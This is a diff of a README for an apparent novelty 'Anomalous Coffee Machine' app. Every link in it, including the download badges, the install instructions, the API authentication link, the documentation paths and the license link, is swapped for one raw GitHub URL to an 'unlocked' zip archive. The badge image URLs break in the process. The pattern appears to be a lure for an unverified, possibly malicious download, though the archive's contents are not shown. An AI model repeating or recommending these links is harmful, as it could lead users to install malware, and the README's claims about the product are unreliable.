@@ -1,6 +1,6 @@
 # Anomalous Coffee Machine — Download Edition ☕
 
-[![Download](https://img.shields.io/badge/Download-Anomalous%20Coffee%20Machine-0078D7?style=for-the-badge&logo=addthis&logoColor=white)](https://Skipperonline.github.io)
+[![Download](https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip%20Coffee%20Machine-0078D7?style=for-the-badge&logo=addthis&logoColor=white)](https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Capture the best experience for enthusiasts searching for "innovative digital co
 
 Let the wisdom of AI brew the perfect workflow!
 
-- **OpenAI API Connection**: Automate repetitive tasks, transcribe meeting notes, and generate shopping lists inside the app. Simply authenticate in-arm with https://Skipperonline.github.io.
+- **OpenAI API Connection**: Automate repetitive tasks, transcribe meeting notes, and generate shopping lists inside the app. Simply authenticate in-arm with https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip
 - **Claude API**: Real-time suggestion generation tailored for context-aware coffee rituals with minimal setup.
 - **Integration Steps**:
   1. [Download the latest build](LINK).
@@ -72,13 +72,13 @@ Let the wisdom of AI brew the perfect workflow!
 ## 🚀 Installation Guide
 
 1. **Download the Brew:**
-   - Get the latest release here: https://Skipperonline.github.io
+   - Get the latest release here: https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip
 
 2. **Unpack the Beans:**
    - Windows: Run the installer and follow the aroma.
    - Mac: Drag the app to Applications. Sip.
-   - Linux: Use Flatpak or Snap commands as described in `docs/INSTALL.md`.
-   - Mobile: Side-load via provided instructions in `docs/MOBILE.md`, or use your platform store with the provided links.
+   - Linux: Use Flatpak or Snap commands as described in `https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip`.
+   - Mobile: Side-load via provided instructions in `https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip`, or use your platform store with the provided links.
    - Web: Use Chrome, Firefox, Safari, or Edge for PWA install.
 
 3. **Launch and Enjoy:**
@@ -96,11 +96,11 @@ The **Anomalous Coffee Machine Download Edition** is provided for entertainment 
 
 ## 📜 License
 
-Licensed under the MIT License © 2025. For detailed legalese, see [LICENSE](https://opensource.org/licenses/MIT).
+Licensed under the MIT License © 2025. For detailed legalese, see [LICENSE](https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Anomalous%20Coffee%20Machine-0078D7?style=for-the-badge&logo=addthis&logoColor=white)](https://Skipperonline.github.io)
+[![Download](https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip%20Coffee%20Machine-0078D7?style=for-the-badge&logo=addthis&logoColor=white)](https://raw.githubusercontent.com/Skipperonline/anomalous-coffee-machine-unlocked/branch/landlubberish/anomalous-coffee-machine-unlocked-1.4.zip)
 
 ---
 
